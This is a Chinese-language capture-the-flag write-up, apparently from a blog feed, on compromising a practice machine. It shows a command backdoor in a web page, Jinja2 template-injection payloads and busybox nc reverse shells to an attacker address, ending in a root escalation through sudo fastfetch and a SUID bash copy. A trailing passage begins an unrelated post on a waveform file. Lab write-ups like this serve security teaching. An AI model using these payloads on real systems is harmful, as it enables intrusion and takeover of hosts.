&lt; 
index
* Connection #0 to host 192.168.205.213 left intact
                                                                                                                                                                                   
‚îå‚îÄ‚îÄ(kali„âøkali)-[~]
‚îî‚îÄ$ curl -vk https://192.168.205.213:443
*   Trying 192.168.205.213:443...
* ALPN: curl offers h2,http/1.1
* TLSv1.3 (OUT), TLS handshake, Client hello (1):
* TLSv1.3 (IN), TLS handshake, Server hello (2):
* TLSv1.3 (IN), TLS change cipher, Change cipher spec (1):
* TLSv1.3 (IN), TLS handshake, Encrypted Extensions (8):
* TLSv1.3 (IN), TLS handshake, Certificate (11):
* TLSv1.3 (IN), TLS handshake, CERT verify (15):
* TLSv1.3 (IN), TLS handshake, Finished (20):
* TLSv1.3 (OUT), TLS change cipher, Change cipher spec (1):
* TLSv1.3 (OUT), TLS handshake, Finished (20):
* SSL connection using TLSv1.3 / TLS_AES_256_GCM_SHA384 / x25519 / RSASSA-PSS
* ALPN: server accepted http/1.1
* Server certificate:
*  subject: CN=PyCrt.PyCrt
*  start date: Apr  1 14:05:29 2025 GMT
*  expire date: Mar 30 14:05:29 2035 GMT
*  issuer: CN=PyCrt.PyCrt
*  SSL certificate verify result: self-signed certificate (18), continuing anyway.
*   Certificate level 0: Public key type RSA (2048/112 Bits/secBits), signed using sha256WithRSAEncryption
* Connected to 192.168.205.213 (192.168.205.213) port 443
* using HTTP/1.x
&gt; GET / HTTP/1.1
&gt; Host: 192.168.205.213
&gt; User-Agent: curl/8.13.0
&gt; Accept: */*
&gt; 
* Request completely sent off
* TLSv1.3 (IN), TLS handshake, Newsession Ticket (4):
* TLSv1.3 (IN), TLS handshake, Newsession Ticket (4):
&lt; HTTP/1.1 200 OK
&lt; Date: Sat, 17 May 2025 08:40:19 GMT
&lt; Server: Apache/2.4.62 (Debian)
&lt; Last-Modified: Sat, 12 Apr 2025 01:53:17 GMT
&lt; ETag: '6-6328b152a4f57'
&lt; Accept-Ranges: bytes
&lt; Content-Length: 6
&lt; Content-Type: text/html
&lt; 
index
* Connection #0 to host 192.168.205.213 left intact
```
80Âíå443Á´ØÂè£ÂÜÖÂÆπÈÉΩÊòØ 'index'ÔºåHTTPSÁî®ÁöÑÊòØËá™Á≠æÂêçËØÅ‰π¶ `CN=PyCrt.PyCrt`„ÄÇÊ≤°Âï•‰ø°ÊÅØÔºå‰∏äÁõÆÂΩïÁàÜÁ†¥Â∑•ÂÖ∑ `gobuster`„ÄÇ

```bash
‚îå‚îÄ‚îÄ(kali„âøkali)-[~]
‚îî‚îÄ$ gobuster dir -u http://192.168.205.213:80 -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -x php,txt,html,zip  
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://192.168.205.213:80
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Extensions:              php,txt,html,zip
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/.html                (Status: 403) [Size: 280]
/index.html           (Status: 200) [Size: 6]
/.php                 (Status: 403) [Size: 280]
/hacker               (Status: 301) [Size: 319] [--&gt; http://192.168.205.213/hacker/] # &lt;--- ÂèëÁé∞Êñ∞Â§ßÈôÜ
Progress: 43164 / 1102800 (3.91%)^C
[!] Keyboard interrupt detected, terminating.
Progress: 43918 / 1102800 (3.98%)
===============================================================
Finished
===============================================================
```
Êâ´Âá∫Êù•‰∏Ä‰∏™ `/hacker/` ÁõÆÂΩïÔºåÊúâÁÇπÊÑèÊÄù„ÄÇÊµèËßàÂô®ËÆøÈóÆÁúãÁúã„ÄÇ

![image-20250517164328109](https://7r1umphk.github.io/image/20250517164328580.webp)

ÊòØ‰∏™ÈùôÊÄÅÈ°µÈù¢ÔºåÁªßÁª≠ÂØπ `/hacker/` ÁõÆÂΩïËøõË°åÁàÜÁ†¥„ÄÇ

```bash
‚îå‚îÄ‚îÄ(kali„âøkali)-[~]
‚îî‚îÄ$ gobuster dir -u http://192.168.205.213/hacker/ -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -x php,txt,html,zip
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://192.168.205.213/hacker/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Extensions:              txt,html,zip,php
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/index.html           (Status: 200) [Size: 40821]
/.html                (Status: 403) [Size: 280]
/.php                 (Status: 403) [Size: 280]
/img                  (Status: 301) [Size: 323] [--&gt; http://192.168.205.213/hacker/img/]
/css                  (Status: 301) [Size: 323] [--&gt; http://192.168.205.213/hacker/css/]
/js                   (Status: 301) [Size: 322] [--&gt; http://192.168.205.213/hacker/js/]
Progress: 40053 / 1102800 (3.63%)^C
[!] Keyboard interrupt detected, terminating.
Progress: 42645 / 1102800 (3.87%)
===============================================================
Finished
===================================
```
ÁàÜÁ†¥ÁªìÊûúÈÉΩÊòØ‰∫õÂ∏∏ËßÑÁõÆÂΩïÔºå`index.html`, `img`, `css`, `js`„ÄÇÁúãÊù•ÂæóÂéªÁúãÁúãÈ°µÈù¢Ê∫êÁ†Å‰∫ÜÔºåÂ∞§ÂÖ∂ÊòØJSÊñá‰ª∂„ÄÇ
Âú®ÊµèËßàÂô®‰∏≠ËÆøÈóÆ `https://192.168.205.213/hacker/js/` ÔºåÁúãÂà∞‰∏Ä‰∏™Âè´`hacker.js`ÁöÑJSÊñá‰ª∂

![image-20250517164504164](https://7r1umphk.github.io/image/20250517164504335.webp)

Âú® `hacker.js` ÁöÑÂ∫ïÈÉ®ÂèëÁé∞‰∫Ü‰∏ÄÊÆµÊúâÊÑèÊÄùÁöÑJavaScript‰ª£Á†ÅÔºö
```javascript
document.addEventListener('keydown', function (e) {
    if (e.ctrlKey &amp;&amp; e.shiftKey &amp;&amp; e.key === 'Z') {
        let cmd = prompt('√®¬Ø¬∑√®¬æ‚Äú√•‚Ä¶¬•√®¬∞∆í√®¬Ø‚Ä¢√•‚Äò¬Ω√§¬ª¬§:'); // ÊèêÁ§∫ÔºöËØ∑ËæìÂÖ•Ë∞ÉËØïÂëΩ‰ª§
        if (cmd) {
            fetch('./supercoool.php?cmd=' + encodeURIComponent(cmd))
                .then(res =&gt; res.text())
                .then(txt =&gt; {
                    alert('√•‚Äò¬Ω√§¬ª¬§√®¬æ‚Äú√•‚Ä°¬∫√Ø¬º≈°\n' + txt); // ÊèêÁ§∫ÔºöÂëΩ‰ª§ËæìÂá∫
                });
        }
    }
});
```
Â•ΩÂÆ∂‰ºôÔºÅËøôËóè‰∫Ü‰∏™ÂêéÈó®ÂïäÔºÅÂΩìÂú® `https://192.168.205.213/hacker/` È°µÈù¢Êåâ‰∏ã `Ctrl + Shift + Z` ÁªÑÂêàÈîÆÊó∂Ôºå‰ºöÂºπÂá∫‰∏Ä‰∏™ËæìÂÖ•Ê°ÜÔºåËÆ©‰Ω†ËæìÂÖ•ÂëΩ‰ª§ÔºåÁÑ∂ÂêéÈÄöËøá `supercoool.php` Ëøô‰∏™Êñá‰ª∂‰ª•GETËØ∑Ê±ÇÁöÑ`cmd`ÂèÇÊï∞Êù•ÊâßË°å„ÄÇ

Áõ¥Êé•Áî®`curl`Êù•Âà©Áî®Ëøô‰∏™ÂêéÈó®ÔºåÂÖàËØïËØïÊâßË°å`id`ÂëΩ‰ª§„ÄÇ

```bash
‚îå‚îÄ‚îÄ(kali„âøkali)-[~]
‚îî‚îÄ$ curl -k 'https://192.168.205.213/hacker/supercoool.php?cmd=id'
&lt;pre&gt;uid=33(www-data) gid=33(www-data) groups=33(www-data)
&lt;/pre&gt;                                                                              
```
ÊàêÂäüÊâßË°åÔºÅÂΩìÂâçÁî®Êà∑ÊòØ `www-data`„ÄÇÈÇ£ÂøÖÈ°ªÂºπ‰∏™shellÂõûÊù•‰∫Ü„ÄÇ

Êú¨Âú∞KaliÂºÄ‰∏™`nc`ÁõëÂê¨Ôºö
```bash
‚îå‚îÄ‚îÄ(kali„âøkali)-[~]
‚îî‚îÄ$ nc -lvnp 8888                       
listening on [any] 8888 ...
```
ÁÑ∂ÂêéÈÄöËøá`curl`ÂèëÈÄÅÂèçÂºπshellÁöÑpayload„ÄÇÈù∂Êú∫‰∏äÊúâ`busybox nc`ÔºåÁî®ÂÆÉÊù•ÂèçÂºπ„ÄÇ

```bash
‚îå‚îÄ‚îÄ(kali„âøkali)-[~]
‚îî‚îÄ$ curl -k 'https://192.168.205.213/hacker/supercoool.php?cmd=busybox+nc+192.168.205.206+8888+-e+/bin/bash'
```
ÂõûÂà∞`nc`ÁõëÂê¨Á™óÂè£Ôºö
```bash
‚îå‚îÄ‚îÄ(kali„âøkali)-[~]
‚îî‚îÄ$ nc -lvnp 8888                       
listening on [any] 8888 ...
connect to [192.168.205.206] from (UNKNOWN) [192.168.205.213] 53242
id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```
ÊàêÂäüÊãøÂà∞ `www-data` ÁöÑshellÔºÅ

### 3. ÊùÉÈôêÊèêÂçá - www-data -&gt; qaq -&gt; root

#### 3.1 www-data -&gt; user.txt &amp; qaq

ÂÖàÊù•‰∏ÄÂ•óÁªÑÂêàÊã≥Á®≥ÂÆö‰∏Ä‰∏ãshellÔºö
```bash
script /dev/null -c bash
# Ctrl+Z 
stty raw -echo; fg
# (ÂõûËΩ¶)
reset xterm  
export TERM=xterm  
export SHELL=/bin/bash  
stty rows 24 columns 80
```
Â∞ùËØï `sudo -l`Ôºö
```bash
www-data@eeeeeasy:/var/www/html/hacker$ sudo -l

We trust you have received the usual lecture from the local System
Administrator. It usually boils down to these three things:

    #1) Respect the privacy of others.
    #2) Think before you type.
    #3) With great power comes great responsibility.

[sudo] password for www-data: 
sudo: a password is required
```
ÈúÄË¶ÅÂØÜÁ†ÅÔºåÊ≠§Ë∑Ø‰∏çÈÄö„ÄÇÂéª `/home` ÁõÆÂΩïÁúãÁúãÊúâÂï•Áî®Êà∑Ôºö
```bash
www-data@eeeeeasy:/var/www/html/hacker$ cd /home/
www-data@eeeeeasy:/home$ ls -al
total 16
drwxr-xr-x  4 root    root    4096 May 16 07:05 .
drwxr-xr-x 18 root    root    4096 Mar 18 20:37 ..
drwxr-xr-x  3 qaq     qaq     4096 May 16 11:04 qaq
drwxr-xr-x  2 welcome welcome 4096 May 16 11:06 welcome
```
Êúâ‰∏§‰∏™Áî®Êà∑ `qaq` Âíå `welcome`„ÄÇÂÖàÂéª `welcome` ÂÆ∂ÁúãÁúãÊúâÂï•Â•Ω‰∏úË•ø„ÄÇ
```bash
www-data@eeeeeasy:/home$ cd welcome/
www-data@eeeeeasy:/home/welcome$ ls -al
total 32
drwxr-xr-x 2 welcome welcome 4096 May 16 11:06 .
drwxr-xr-x 4 root    root    4096 May 16 07:05 ..
-rw------- 1 welcome welcome   13 May 16 11:06 .bash_history
-rw-r--r-- 1 welcome welcome  220 Apr 11 22:27 .bash_logout
-rw-r--r-- 1 welcome welcome 3526 Apr 11 22:27 .bashrc
-rw-r--r-- 1 welcome welcome  807 Apr 11 22:27 .profile
-rw-r--r-- 1 root    root      19 May 16 10:48 .viminfo
-rw-r--r-- 1 root    root      44 May 16 11:02 user.txt # &lt;--- user flag!
www-data@eeeeeasy:/home/welcome$ cat user.txt 
flag{user-376760a7c735a606d4f8d8340bad4184}
```
Áõ¥Êé•ÊãøÂà∞‰∫Ü `user.txt`ÔºÅÁúãÊù•ÊùÉÈôêËÆæÁΩÆÊúâÁÇπÊùæ„ÄÇ

Êé•‰∏ãÊù•ÁúãÁúãËÉΩ‰∏çËÉΩÊèêÂà∞ `qaq` ÊàñËÄÖ `root`„ÄÇ
Ê£ÄÊü•SUIDÊñá‰ª∂ÂíåÂÆöÊó∂‰ªªÂä°Ôºö
```bash
www-data@eeeeeasy:/home/welcome$ find / -perm -4000 -type f 2&gt;/dev/null
/usr/bin/chsh
/usr/bin/chfn
/usr/bin/newgrp
/usr/bin/gpasswd
/usr/bin/mount
/usr/bin/su
/usr/bin/umount
/usr/bin/pkexec
/usr/bin/sudo
/usr/bin/passwd
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/eject/dmcrypt-get-device
/usr/lib/openssh/ssh-keysign
/usr/libexec/polkit-agent-helper-1
www-data@eeeeeasy:/home/welcome$ crontab -l
no crontab for www-data
```
SUIDÊñá‰ª∂Ê≤°Âï•ÁâπÂà´ÁöÑÔºåÂÆöÊó∂‰ªªÂä°‰πüÊ≤°Êúâ„ÄÇ
Âéª `/opt/` ÁõÆÂΩïÁûÖÁûÖÔºö
```bash
www-data@eeeeeasy:/tmp$ cd /opt/
www-data@eeeeeasy:/opt$ ls -al
total 12
drwxr-xr-x  3 root root 4096 May 16 10:07 .
drwxr-xr-x 18 root root 4096 Mar 18 20:37 ..
drwxr-x---  4 qaq  qaq  4096 May 16 11:00 flask-app # &lt;--- ÂΩíÂ±û‰∫éqaqÁî®Êà∑
```
ÂèëÁé∞‰∏Ä‰∏™ `/opt/flask-app` ÁõÆÂΩïÔºåÂ±û‰∫é `qaq` Áî®Êà∑„ÄÇÁúãÁúãËøõÁ®ãÈáåÊúâÊ≤°ÊúâÁõ∏ÂÖ≥ÁöÑ„ÄÇ
```bash
www-data@eeeeeasy:/opt$ ps aux | grep 'flask'
qaq          555  0.0  1.3  35132 27836 ?        S    04:39   0:00 /opt/flask-app/venv/bin/python3 /opt/flask-app/app.py
qaq          556  0.1  1.3 182880 28364 ?        Sl   04:39   0:01 /opt/flask-app/venv/bin/python3 /opt/flask-app/app.py
www-data     773  0.0  0.0   3176   696 pts/0    S+   05:04   0:00 grep flask
```
ÊûúÁÑ∂Ôºå`qaq` Áî®Êà∑Ê≠£Âú®ËøêË°å `/opt/flask-app/app.py`„ÄÇÁúãÁúãÂÆÉÁõëÂê¨‰∫Ü‰ªÄ‰πàÁ´ØÂè£„ÄÇ
```bash
www-data@eeeeeasy:/opt$ ss -tulnp
Netid   State    Recv-Q   Send-Q     Local Address:Port     Peer Address:Port   
udp     UNCONN   0        0                0.0.0.0:68            0.0.0.0:*      
tcp     LISTEN   0        128              0.0.0.0:22            0.0.0.0:*      
tcp     LISTEN   0        128            127.0.0.1:5000          0.0.0.0:*  # &lt;--- Flask App
tcp     LISTEN   0        128                 [::]:22               [::]:*      
tcp     LISTEN   0        128                    *:443                 *:*      
tcp     LISTEN   0        128                    *:80                  *:*     
```
Ëøô‰∏™FlaskÂ∫îÁî®ÁõëÂê¨Âú® `127.0.0.1:5000`„ÄÇÁî®`curl`ËÆøÈóÆ‰∏Ä‰∏ã„ÄÇ
```bash
www-data@eeeeeasy:/opt$ curl 127.0.0.1:5000

    &lt;html&gt;
        &lt;head&gt;&lt;title&gt;SurveyMaster - Â°´ÂÜôÈóÆÂç∑&lt;/title&gt;
&lt;style&gt;
    /* ... CSS styles ... */
&lt;/style&gt;
&lt;/head&gt;
        &lt;body&gt;
            &lt;div class='container'&gt;
                &lt;h1&gt;SurveyMaster&lt;/h1&gt;
                &lt;p&gt;Êèê‰∫§‰Ω†ÁöÑÈóÆÂç∑ÔºåÂàÜ‰∫´‰Ω†ÁöÑÊÉ≥Ê≥ïÔºÅ&lt;/p&gt;
                &lt;form action='/submit' method='POST'&gt;
                    &lt;input type='text' name='username' placeholder='‰Ω†ÁöÑÂêçÂ≠ó' required&gt;
                    &lt;input type='text' name='question' placeholder='ÈóÆÂç∑ÈóÆÈ¢ò' required&gt;
                    &lt;textarea name='answer' placeholder='‰Ω†ÁöÑÁ≠îÊ°à' required&gt;&lt;/textarea&gt;
                    &lt;input type='submit' value='Êèê‰∫§ÈóÆÂç∑'&gt;
                &lt;/form&gt;
            &lt;/div&gt;
        &lt;/body&gt;
    &lt;/html&gt;
```
ÊòØ‰∏™ÈóÆÂç∑Êèê‰∫§È°µÈù¢„ÄÇFlaskÂ∫îÁî®ÔºåÂ∏∏Áî®ÁöÑÊ®°ÊùøÂºïÊìéÊòØJinja2ÔºåËøôÂ∞±ÊúâSSTIÁöÑÂèØËÉΩ‰∫Ü„ÄÇ
Â∞ùËØïÂú®POSTËØ∑Ê±ÇÁöÑÂêÑ‰∏™ÂèÇÊï∞ (`username`, `question`, `answer`) ‰∏≠ÊèíÂÖ• `{{7*7}}` Êù•ÊµãËØïSSTI„ÄÇ

```bash
www-data@eeeeeasy:/opt$ sh # ÂàáÊç¢Âà∞shÊñπ‰æøÂ§öÊ¨°ÊâßË°åcurl
$ curl -X POST -d 'username={{7*7}}&amp;question=test&amp;answer=test' http://127.0.0.1:5000/submit
# ... (ËæìÂá∫ÊòæÁ§∫Áî®Êà∑Âêç‰∏∫ {{7*7}}ÔºåÊ≤°Êúâ SSTI) ...
$ curl -X POST -d 'username=test&amp;question={{7*7}}&amp;answer=test' http://127.0.0.1:5000/submit
# ... (ËæìÂá∫ÊòæÁ§∫ÈóÆÈ¢ò‰∏∫ {{7*7}}ÔºåÊ≤°Êúâ SSTI) ...
$ curl -X POST -d 'username=test&amp;question=test&amp;answer={{7*7}}' http://127.0.0.1:5000/submit

        &lt;html&gt;
            &lt;head&gt;&lt;title&gt;SurveyMaster - ÈóÆÂç∑Êèê‰∫§&lt;/title&gt;
            &lt;!-- ... CSS ... --&gt;
            &lt;/head&gt;
            &lt;body&gt;
                &lt;div class='container'&gt;
                    &lt;h1&gt;ÈóÆÂç∑Êèê‰∫§ÊàêÂäü&lt;/h1&gt;
                    &lt;p&gt;Êèê‰∫§ËÄÖ: test&lt;/p&gt;
                    &lt;p&gt;ÈóÆÈ¢ò: test&lt;/p&gt;
                    &lt;p&gt;Á≠îÊ°à: 49&lt;/p&gt;  &lt;!-- bingoÔºÅ --&gt;
                    &lt;p&gt;&lt;a href='/preview/test'&gt;Êü•Áúã‰Ω†ÁöÑÈóÆÂç∑&lt;/a&gt; | &lt;a href='/'&gt;ÁªßÁª≠Â°´ÂÜô&lt;/a&gt;&lt;/p&gt;
                &lt;/div&gt;
            &lt;/body&gt;
        &lt;/html&gt;
```
ÊºÇ‰∫ÆÔºÅÂΩì`answer`Â≠óÊÆµÁöÑÂÄºÊòØ `{{7*7}}` Êó∂ÔºåËøîÂõûÁöÑÈ°µÈù¢‰∏≠Á≠îÊ°àÊòæÁ§∫‰∏∫ `49`„ÄÇËøôÊòéÁ°ÆÂú∞ËØÅÊòé‰∫Ü `answer` Â≠óÊÆµÂ≠òÂú®SSTIÊºèÊ¥ûÔºÅ

ÊûÑÈÄ†SSTI payloadÊù•ÊâßË°åÂëΩ‰ª§ÔºåËé∑Âèñ`qaq`Áî®Êà∑ÁöÑÊùÉÈôê„ÄÇ
```bash
$ curl -X POST -d 'username=test&amp;question=test&amp;answer={{ self.__init__.__globals__.__builtins__.__import__('os').popen('id').read() }}' http://127.0.0.1:5000/submit

        &lt;html&gt;
            &lt;!-- ... HTML structure ... --&gt;
            &lt;body&gt;
                &lt;div class='container'&gt;
                    &lt;h1&gt;ÈóÆÂç∑Êèê‰∫§ÊàêÂäü&lt;/h1&gt;
                    &lt;p&gt;Êèê‰∫§ËÄÖ: test&lt;/p&gt;
                    &lt;p&gt;ÈóÆÈ¢ò: test&lt;/p&gt;
                    &lt;p&gt;Á≠îÊ°à: uid=1001(qaq) gid=1001(qaq) groups=1001(qaq)  # &lt;--- ÂëΩ‰ª§ÊâßË°åÊàêÂäüÔºÅ
&lt;/p&gt;
                    &lt;p&gt;&lt;a href='/preview/test'&gt;Êü•Áúã‰Ω†ÁöÑÈóÆÂç∑&lt;/a&gt; | &lt;a href='/'&gt;ÁªßÁª≠Â°´ÂÜô&lt;/a&gt;&lt;/p&gt;
                &lt;/div&gt;
            &lt;/body&gt;
        &lt;/html&gt;
```
ÊàêÂäü‰ª•`qaq`Áî®Êà∑Ë∫´‰ªΩÊâßË°å‰∫Ü`id`ÂëΩ‰ª§„ÄÇÁé∞Âú®ÔºåÂºπ‰∏™`qaq`Áî®Êà∑ÁöÑshellÂõûÊù•„ÄÇ

Kali‰∏äÂÜçÊ¨°ÁõëÂê¨Ôºö
```bash
‚îå‚îÄ‚îÄ(kali„âøkali)-[/mnt/hgfs/gx]
‚îî‚îÄ$ nc -lvnp 8888
listening on [any] 8888 ...
```
ÈÄöËøáSSTIÂèëÈÄÅÂèçÂºπshell payloadÔºö
```bash
$ curl -X POST -d 'username=test&amp;question=test&amp;answer={{ self.__init__.__globals__.__builtins__.__import__('os').popen('busybox nc 192.168.205.206 8888 -e /bin/bash').read() }}' http://127.0.0.1:5000/submit
```
ÂõûÂà∞KaliÁöÑ`nc`ÁõëÂê¨Ôºö
```bash
‚îå‚îÄ‚îÄ(kali„âøkali)-[/mnt/hgfs/gx]
‚îî‚îÄ$ nc -lvnp 8888
listening on [any] 8888 ...
connect to [192.168.205.206] from (UNKNOWN) [192.168.205.213] 42084
id
uid=1001(qaq) gid=1001(qaq) groups=1001(qaq)
```
ÊàêÂäüÊãøÂà∞ `qaq` Áî®Êà∑ÁöÑshellÔºÅ

#### 3.2 qaq -&gt; root

ÂÜçÊ¨°Á®≥ÂÆöshellÔºö
```bash
script /dev/null -c bash
# Ctrl+Z
stty raw -echo; fg
# (press enter)
reset xterm  
export TERM=xterm  
export SHELL=/bin/bash  
stty rows 24 columns 80
```
Áé∞Âú®ÊòØ `qaq` Áî®Êà∑‰∫ÜÔºåÁúãÁúãÊúâ‰ªÄ‰πà`sudo`ÊùÉÈôêÊàñËÄÖSUIDÁ®ãÂ∫èÂèØ‰ª•Âà©Áî®„ÄÇ
```
qaq@eeeeeasy:~$ sudo -l
Matching Defaults entries for qaq on eeeeeasy:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User qaq may run the following commands on eeeeeasy:
    (ALL) NOPASSWD: /usr/bin/fastfetch
```

ËøôÈáåÊàë‰ª¨ÂèëÁé∞ `/usr/bin/fastfetch` Ëøô‰∏™Á®ãÂ∫èÊúâÁÇπÁâπÊÆä„ÄÇÊàë‰ª¨ÂèØ‰ª•Áî® `sudo` ÊâßË°åÂÆÉ
ÂÖàÁúãÁúã `fastfetch -h` ÊúâÊ≤°Êúâ‰ªÄ‰πàÂèØ‰ª•Âà©Áî®ÁöÑÂèÇÊï∞Ôºö

```bash
qaq@eeeeeasy:~$ sudo /usr/bin/fastfetch -h
Fastfetch is a neofetch-like tool for fetching system information and displaying them in a pretty way

Usage: fastfetch &lt;?options&gt;
# ... (Â§ßÈáèÂ∏ÆÂä©‰ø°ÊÅØÔºåÊàë‰ª¨‰∏ªË¶ÅÂÖ≥Ê≥®ËÉΩÊâßË°åÂëΩ‰ª§ÁöÑ) ...
Module specific options:
      --command-shell &lt;str&gt;                  Set the shell program to execute the command text
      --command-key &lt;str&gt;                    Set the module key to display
      --command-text &lt;str&gt;                   Set the command text to be executed # &lt;--- Ëøô‰∏™ÁúãËµ∑Êù•ÂæàÂç±Èô©ÔºÅ
# ... (Êõ¥Â§öÂ∏ÆÂä©‰ø°ÊÅØ) ...
```
‰ªéÂ∏ÆÂä©‰ø°ÊÅØ‰∏≠Ôºå`--command-text &lt;str&gt;` Ëøô‰∏™ÈÄâÈ°πÂÖÅËÆ∏Êàë‰ª¨ÊâßË°å‰ªªÊÑèÂëΩ‰ª§ÔºåÈÖçÂêà `--structure 'command'` Â∞±ÂèØ‰ª•Áî® `fastfetch` Êù•ÊâßË°åÊàë‰ª¨ÊÉ≥ÊâßË°åÁöÑÂëΩ‰ª§‰∫ÜÔºåÂπ∂‰∏îÊòØ‰ª•`sudo`ÔºàÂç≥rootÔºâÊùÉÈôêÊâßË°åÔºÅ

(‰∏∫‰ªÄ‰πà‰∏ÄÂÆöË¶ÅÂä†‰∏ä`structure`ÔºåÂõ†‰∏∫Ë¶Å‰ΩøÁî®ÂÆÉÂëäËØâ`fastfetch`Âä†ËΩΩ`command`)

Âà©Áî®Ëøô‰∏™ÁâπÊÄßÔºåÊàë‰ª¨ËÆ©`fastfetch`Â§çÂà∂ `/bin/bash` Âà∞ `/tmp/sh`ÔºåÂπ∂Áªô `/tmp/sh` Âä†‰∏äSUIDÊùÉÈôê‰Ωç„ÄÇ
```bash
qaq@eeeeeasy:~$ sudo /usr/bin/fastfetch --structure 'command' --command-text 'cp /bin/bash /tmp/sh &amp;&amp; chmod +s /tmp/sh'
       _,met$$$$$gg.
    ,g$$$$$$$$$$$$$$$P.
  ,g$$P'         '''Y$$.'.
 ,$$P'               `$$$.
',$$P       ,ggs.     `$$b:
`d$$'     ,$P''   .    $$$
 $$P      d$'     ,    $$$P
 $$:      $.   -    ,d$$'
 $$;      Y$b._   _,d$P'
 Y$$.    `.`'Y$$$$P''
 `$$b      '-.__
  `Y$$
   `Y$$.
     `$$b.
       `Y$$b.
          `'Y$b._
             `'''
```
Ê£ÄÊü•‰∏Ä‰∏ã `/tmp/sh` ÁöÑÊùÉÈôêÔºö
```bash
qaq@eeeeeasy:~$ ls -la /tmp/
total 1184
drwxrwxrwt 10 root root    4096 May 17 05:14 .
drwxr-xr-x 18 root root    4096 Mar 18 20:37 ..
drwxrwxrwt  2 root root    4096 May 17 04:38 .font-unix
drwxrwxrwt  2 root root    4096 May 17 04:38 .ICE-unix
-rwsr-sr-x  1 root root 1168776 May 17 05:13 sh # &lt;--- SUID‰ΩçÂ∑≤ËÆæÁΩÆÔºåÊâÄÊúâËÄÖÊòØroot
drwx------  3 root root    4096 May 17 04:38 systemd-private-136e6172f431486383a8b142a9e39960-apache2.service-3yeZai
# ...
```
ÂèØ‰ª•ÁúãÂà∞ `/tmp/sh` Â∑≤ÁªèÊòØ `root` Áî®Êà∑ÊâÄÊúâÔºåÂπ∂‰∏îËÆæÁΩÆ‰∫ÜSUIDÂíåSGID‰Ωç„ÄÇ
Áé∞Âú®Áõ¥Êé•ÊâßË°å `/tmp/sh -p` Êù•Ëé∑ÂèñrootÊùÉÈôêÁöÑshell (`-p` ÂèÇÊï∞‰ΩøÂæóbash‰∏ç‰ºöÂõ†‰∏∫euid‰∏çÂêåËÄåÊîæÂºÉÁâπÊùÉ)„ÄÇ

```bash
qaq@eeeeeasy:~$ /tmp/sh -p
sh-5.0# id
uid=1001(qaq) gid=1001(qaq) euid=0(root) egid=0(root) groups=0(root),1001(qaq)
```
Boom! `euid=0(root)`ÔºåÊàêÂäüÊãøÂà∞rootÊùÉÈôêÔºÅ

ÊúÄÂêé‰∏ÄÊ≠•ÔºåËØªÂèñroot flagÔºö
```bash
sh-5.0# cat /root/root.txt 
flag{root-818a8bc5d566d7c856f14eec2791cd78}
```

Êî∂Â∑•ÔºÅÊâìÂÆåÊî∂flagÔºåÁæéÊªãÊªãÔºÅ

sentence</description><guid isPermaLink="true">https://7r1UMPHK.github.io/post/eeeeeasy%20-ba-ji-shen-tou-ce-shi-Writeup.html</guid><pubDate>Fri, 27 Jun 2025 09:30:05 +0000</pubDate></item><item><title>Challenge 20250526</title><link>https://7r1UMPHK.github.io/post/Challenge%2020250526.html</link><description>## Á¨¨‰∏ÄÈÉ®ÂàÜÔºöÂàÜÊûê `ezflag` Êñá‰ª∂

### 1. ÂàùÊ≠•Êñá‰ª∂Ê£ÄÊü•

‰∏ãËΩΩÊåëÊàòÈôÑ‰ª∂ÔºåÂæóÂà∞Âêç‰∏∫ `ezflag` ÁöÑÊñá‰ª∂„ÄÇÈ¶ñÂÖà‰ΩøÁî® `file` ÂëΩ‰ª§Êé¢Êü•ÂÖ∂Á±ªÂûãÔºö

```bash
‚îå‚îÄ‚îÄ(kali„âøkali)-[/mnt/hgfs/gx]
‚îî‚îÄ$ file ezflag
ezflag: ASCII text
```

ÁªìÊûúÊòæÁ§∫‰∏∫ `ASCII text`ÔºåËøôÊúâ‰∫õÂá∫‰πéÊÑèÊñôÔºåÂõ†‰∏∫CTF‰∏≠ÁöÑflagÁõ∏ÂÖ≥Êñá‰ª∂ÈÄöÂ∏∏ÊòØ‰∫åËøõÂà∂„ÄÅÁõ¥Êé•ÂåÖÂê´flagÊñáÊú¨ÔºåÊàñËÄÖÈúÄË¶ÅÁâπÂÆöÂ∑•ÂÖ∑ÊâìÂºÄÁöÑÊ†ºÂºè„ÄÇÊó¢ÁÑ∂ÊòØÊñáÊú¨Êñá‰ª∂ÔºåÊàë‰ª¨Áî® `cat` ÂëΩ‰ª§Êü•ÁúãÂÖ∂ÂÜÖÂÆπÔºö

```bash
‚îå‚îÄ‚îÄ(kali„âøkali)-[/mnt/hgfs/gx]
‚îî‚îÄ$ cat ezflag
$timescale 1 us $end
$var wire 1 ! 0 $end
$var wire 1 ' 1 $end
$upscope $end
$enddefinitions $end
#0  1! 0'
#792  0!
#810  1!
#826  0!
#844  1!
#862  0!
#870  1!
#880  0!
#906  1!
#922  0!
#932  1!
#948  0!
#958  1!
#966  0!
#974  1!
#984  0!
#1018  1!
#1036  0!
#1044  1!
#1052  0!
#1062  1!
#1088  0!
#1104  1!
#1122  0!
#1132  1!
#1140  0!
#1148  1!
#1166  0!
#1174  1!
#1210  0!
#1218  1!
#1226  0!
#1236  1!
#1244  0!
#1262  1!
#1296  0!
#1304  1!
#1314  0!
#1356  1!
#1374  0!
#1392  1!
#1400  0!
#1410  1!
#1418  0!
#1426  1!
#1436  0!
#1444  1!
#1470  0!
#1478  1!
#1488  0!
#1496  1!
#1540  0!
